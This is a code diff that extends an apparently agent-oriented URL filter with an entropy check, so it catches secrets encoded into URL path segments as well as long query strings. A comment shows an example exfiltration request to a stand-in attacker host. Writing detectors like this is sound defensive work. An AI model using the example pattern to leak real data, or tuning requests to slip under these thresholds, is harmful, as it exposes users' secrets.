@@ -345,30 +345,66 @@ const MAX_SAFE_QUERY_LENGTH = 256;
 /** Maximum single query parameter value length. */
 const MAX_SAFE_PARAM_VALUE_LENGTH = 128;
 
+/** Minimum path segment length to consider for entropy analysis. */
+const MIN_SUSPICIOUS_SEGMENT_LENGTH = 32;
+
 /**
- * Detect GET/HEAD requests that appear to be exfiltrating data via query parameters.
+ * Shannon entropy of a string, normalized to [0, 1] relative to the charset.
+ * High entropy (>0.7) in long path segments suggests encoded data (base64, hex).
+ */
+function normalizedEntropy(s: string): number {
+	if (s.length === 0) return 0;
+	const freq = new Map<string, number>();
+	for (const ch of s) {
+		freq.set(ch, (freq.get(ch) ?? 0) + 1);
+	}
+	let entropy = 0;
+	for (const count of freq.values()) {
+		const p = count / s.length;
+		entropy -= p * Math.log2(p);
+	}
+	// Normalize: max entropy for base64 charset (~64 chars) is log2(64) = 6
+	return entropy / 6;
+}
+
+/**
+ * Detect GET/HEAD requests that appear to be exfiltrating data via query parameters
+ * or URL path segments.
  *
  * Heuristic checks:
  * - Query string longer than 256 chars (data smuggling)
  * - Any single query parameter value longer than 128 chars (encoded payload)
+ * - Path segments longer than 32 chars with high entropy (base64/hex encoded data)
  *
- * This is intentionally simple — it catches obvious exfil patterns without
- * becoming a full DLP engine. Normal page-fetch URLs pass through cleanly.
+ * The path-segment check catches exfil patterns like:
+ *   GET https://attacker.tld/leak/SGVsbG8gV29ybGQ=
+ * where there is no query string but the secret is encoded in the path.
  */
 export function isSuspiciousGetExfil(url: string): boolean {
 	try {
 		const parsed = new URL(url);
 		const query = parsed.search;
 
-		// No query string → definitely not exfil via query params
-		if (!query || query.length <= 1) return false;
+		// Query string checks
+		if (query && query.length > 1) {
+			// Long query strings suggest data smuggling
+			if (query.length > MAX_SAFE_QUERY_LENGTH) return true;
 
-		// Long query strings suggest data smuggling
-		if (query.length > MAX_SAFE_QUERY_LENGTH) return true;
+			// Check individual parameter values for large payloads
+			for (const [, value] of parsed.searchParams) {
+				if (value.length > MAX_SAFE_PARAM_VALUE_LENGTH) return true;
+			}
+		}
 
-		// Check individual parameter values for large payloads
-		for (const [, value] of parsed.searchParams) {
-			if (value.length > MAX_SAFE_PARAM_VALUE_LENGTH) return true;
+		// Path segment checks — detect encoded data in URL path
+		const segments = parsed.pathname.split("/").filter(Boolean);
+		for (const segment of segments) {
+			if (
+				segment.length >= MIN_SUSPICIOUS_SEGMENT_LENGTH &&
+				normalizedEntropy(segment) > 0.7
+			) {
+				return true;
+			}
 		}
 
 		return false;
